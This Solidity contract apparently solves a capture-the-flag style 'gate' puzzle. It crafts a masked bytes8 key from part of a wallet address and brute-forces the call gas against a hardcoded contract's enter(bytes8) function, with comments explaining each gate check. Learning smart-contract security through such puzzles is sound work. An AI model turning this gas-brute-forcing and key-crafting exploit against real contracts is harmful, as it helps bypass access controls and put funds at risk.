// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

 contract GatePasser{

    address gate = 0x7092D73FD1E1B5113692AE8e2b5c11734C41b8e5;
    // 8 bytes = 64 bits ||||| bytes8 = 16 digits, uint64 = 16 digits, A. HEX. DIGIT. TAKES. FOUR. BITS.!!!!!
    bytes8 txOrigin64 = 0xdCaFC94638fe7B17; //9eA8B00029Cf9C1B57483eca - this is cut out of ethereum wallet address to bring it down to 64 bits
    // 8 byte   > 0xdCaFC94638fe7B17
    // Mask     > 0xFFFFFFFF0000FFFF
    // KEY      > 0xdCaFC94600007B17
        // gate 3.1 - 0x00007B17 == 0x7B17 
        // gate 3.2 - 0x00007B17 != 0xdCaFC94600007B17 F is "1111" in binary (15 in decimal)
        // gate 3.3 - 0x00007B17 == 0x7B17
    bytes8 key = txOrigin64 & 0xFFFFFFFF0000FFFF;
    uint256 i = uint256(uint160(address(tx.origin)));

    function letMeIn() public {
        for (uint z = 0; z < 120; z++) {
            (bool result, bytes memory data) = address(gate).call{gas: z + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)",key));
            if(result){break;}
        }
    }
 }